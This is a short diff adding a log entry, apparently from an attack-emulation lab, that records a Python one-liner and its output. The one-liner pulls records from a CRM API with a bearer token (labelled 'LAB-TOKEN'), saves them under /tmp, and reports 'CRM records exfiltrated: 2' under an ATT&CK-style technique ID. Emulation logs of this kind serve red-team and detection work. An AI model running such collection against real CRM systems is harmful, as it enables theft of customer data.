@@ -1,0 +1,7 @@
+$ python3 -c "import urllib.request as u, json; req = u.Request('http://172.17.0.3:8443/services/data/v59.0/query', headers={'Authorization':'Bearer LAB-TOKEN'}); data = json.loads(u.urlopen(req, timeout=10).read()); open('/tmp/T1213.004_crm.json','w').write(json.dumps(data, indent=2)); print('CRM records exfiltrated:', data.get('totalSize'))"
+exit_code: 0
+--- stdout ---
+CRM records exfiltrated: 2
+
+--- stderr ---
+
